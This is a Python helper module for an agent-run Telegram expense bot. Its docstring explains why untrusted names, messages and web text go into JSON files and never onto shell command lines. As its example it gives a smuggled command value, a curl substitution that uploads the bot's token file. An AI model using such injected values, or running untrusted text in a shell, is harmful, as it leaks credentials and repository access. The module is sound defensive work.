"""Untrusted text never goes on a shell command line.

Group members choose their own Telegram display names and write the messages,
and web research returns text from pages anyone can edit. If the agent pasted
that text into a Bash command ("--logged-by \"<name>\""), a name such as
`$(curl ... @$HOME/.splitbot/token)` would run as a command in a session that
holds the bot tokens and can push to the repo.

So the bot's scripts take untrusted text from a file the agent writes with its
Write tool (no shell involved):

    --args-json FILE   a JSON object of options, merged into the command line:
                       {"desc": "taxi to Shinjuku", "logged_by": "Ben"} is the
                       same as --desc ... --logged-by ...; true adds a bare flag
                       (--prorate); a list repeats the option (--option A
                       --option B); false and null are skipped.
    --input FILE       JSON lines that would otherwise come on stdin
                       (places.py suggest, plan.py itinerary import).
    --text-file FILE   send.py: the message text.

FILE may be "-" for stdin. Ids, amounts, dates, currencies and categories may
still go on the command line as bare words.
"""

from __future__ import annotations

import json
import re
import sys
from pathlib import Path
from typing import List, Optional

_KEY = re.compile(r"^[a-z][a-z0-9_-]{0,40}$")


def read(path: str) -> str:
    return sys.stdin.read() if path == "-" else Path(path).read_text(encoding="utf-8")


def expand(argv: Optional[List[str]]) -> List[str]:
    """argv with any `--args-json FILE` replaced by the options in FILE.

    Options are appended as `--key=value`, so a value that starts with "-" is
    still read as a value, and they land after the subcommand."""
    argv = list(sys.argv[1:] if argv is None else argv)
    while "--args-json" in argv:
        i = argv.index("--args-json")
        if i + 1 >= len(argv):
            raise SystemExit("--args-json needs a file")
        path = argv[i + 1]
        del argv[i:i + 2]
        try:
            data = json.loads(read(path))
        except (OSError, json.JSONDecodeError) as e:
            raise SystemExit(f"--args-json: cannot read {path}: {e}")
        if not isinstance(data, dict):
            raise SystemExit("--args-json: the file must hold a JSON object")
        for k, v in data.items():
            if not _KEY.match(str(k)) or k == "args-json":
                raise SystemExit(f"--args-json: bad option name {k!r}")
            flag = "--" + k.replace("_", "-")
            if v is True:
                argv.append(flag)
            elif v is False or v is None:
                continue
            elif isinstance(v, list):
                argv += [f"{flag}={x}" for x in v]
            elif isinstance(v, (str, int, float)):
                argv.append(f"{flag}={v}")
            else:
                raise SystemExit(f"--args-json: {k} must be text, a number, true/false or a list")
    return argv
